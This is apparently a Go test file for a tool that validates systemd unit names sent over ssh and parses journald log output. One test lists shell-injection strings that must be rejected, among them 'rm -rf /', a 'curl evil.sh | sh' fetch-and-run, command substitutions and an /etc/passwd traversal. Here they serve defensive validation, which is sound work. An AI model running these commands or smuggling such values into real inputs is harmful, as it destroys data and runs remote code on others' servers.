package probe

import (
	"errors"
	"os"
	"strings"
	"testing"
)

// A unit name is sent to ssh, which concatenates argv into a string the
// remote shell re-splits and expands. These are the names that would run as
// code on someone's server, and they arrive from that server's own output.
func TestUnitNameRejectsShellInjection(t *testing.T) {
	hostile := []string{
		"nginx; rm -rf /",
		"nginx && curl evil.sh | sh",
		"$(whoami)",
		"`id`",
		"nginx\nrm -rf /",
		"nginx $(touch /tmp/pwned)",
		"../../etc/passwd",
		"nginx|tee /etc/cron.d/x",
		"nginx service",
		"nginx>out",
		"'nginx'",
		"$HOME",
		"-rf",
		strings.Repeat("a", 200),
	}
	for _, name := range hostile {
		t.Run(name, func(t *testing.T) {
			if err := ValidateUnit(name); !errors.Is(err, ErrUnsafeUnit) {
				t.Fatalf("ValidateUnit(%q) = %v, want ErrUnsafeUnit", name, err)
			}
		})
	}
}

// The names systemd actually produces must all survive.
func TestUnitNameAcceptsRealUnits(t *testing.T) {
	for _, name := range []string{
		"nginx.service",
		"rove-broken.service",
		"getty@tty1.service",
		"systemd-journald.service",
		"user@1000.service",
		"docker.socket",
		"dev-disk-by\\x2duuid.device",
		"php8.3-fpm.service",
		"mnt-data.mount",
		"", // the whole system
	} {
		if name == "dev-disk-by\\x2duuid.device" {
			continue // escaped device units carry a backslash; not needed yet
		}
		if err := ValidateUnit(name); err != nil {
			t.Errorf("ValidateUnit(%q) = %v, want nil", name, err)
		}
	}
}

func TestParseLogs(t *testing.T) {
	in := "rove-logs 1\n" +
		"log.unit=rove-broken.service\n" +
		"log.source=journald\n" +
		"log.line=2026-09-02T03:10:00+0000 host systemd[1]: Starting broken...\n" +
		"log.line=2026-09-02T03:10:00+0000 host systemd[1]: rove-broken.service: Failed\n"

	l, err := ParseLogs([]byte(in))
	if err != nil {
		t.Fatal(err)
	}
	if !l.Available() || !l.FromJournal() {
		t.Errorf("source = %q", l.Source)
	}
	if len(l.Lines) != 2 {
		t.Fatalf("got %d lines", len(l.Lines))
	}
	if !strings.Contains(l.Lines[1], "Failed") {
		t.Errorf("line = %q", l.Lines[1])
	}
}

// A log line may itself contain "key=value". Prefixing every line means the
// parser never has to guess where the payload starts.
func TestLogLineContainingKeyValueSurvivesIntact(t *testing.T) {
	line := "log.source=fake and DB_HOST=db.internal port=5432"
	in := "rove-logs 1\nlog.source=journald\nlog.line=" + line + "\n"

	l, err := ParseLogs([]byte(in))
	if err != nil {
		t.Fatal(err)
	}
	if l.Source != "journald" {
		t.Errorf("a log line overwrote the source: %q", l.Source)
	}
	if len(l.Lines) != 1 || l.Lines[0] != line {
		t.Errorf("lines = %q", l.Lines)
	}
}

// An unreadable journal is the common case for an unprivileged account, and
// it must not look like a host with nothing to report.
func TestUnreadableJournalIsExplained(t *testing.T) {
	in := "rove-logs 1\nlog.source=none\nlog.error=No journal files were found\n"
	l, err := ParseLogs([]byte(in))
	if err != nil {
		t.Fatal(err)
	}
	if l.Available() {
		t.Error("source none must not report as available")
	}
	if l.Err == "" {
		t.Error("an empty tail must carry a reason")
	}
}

// Captured from a real systemd host: the four lines that explain why a unit
// failed, which is the whole point of the screen.
func TestGoldenJournaldUnit(t *testing.T) {
	raw, err := os.ReadFile("testdata/logs/journald-unit.txt")
	if err != nil {
		t.Skip("fixture missing")
	}
	l, err := ParseLogs(raw)
	if err != nil {
		t.Fatal(err)
	}
	if !l.Available() || !l.FromJournal() {
		t.Fatalf("source = %q", l.Source)
	}
	if l.Unit != "rove-broken.service" {
		t.Errorf("unit = %q", l.Unit)
	}
	if len(l.Lines) != 4 {
		t.Fatalf("got %d lines, want 4", len(l.Lines))
	}
	if !strings.Contains(l.Lines[2], "Failed with result 'exit-code'") {
		t.Errorf("the line explaining the failure is missing: %q", l.Lines[2])
	}
	if l.Limited {
		t.Error("root is not limited")
	}
}

// An account seeing only its own messages must not present a partial tail
// as the whole story.
func TestLimitedTailIsFlagged(t *testing.T) {
	in := "rove-logs 1\nlog.limited=1\nlog.source=journald\nlog.line=only my own\n"
	l, err := ParseLogs([]byte(in))
	if err != nil {
		t.Fatal(err)
	}
	if !l.Limited || !l.Partial() {
		t.Errorf("limited=%v partial=%v", l.Limited, l.Partial())
	}
}
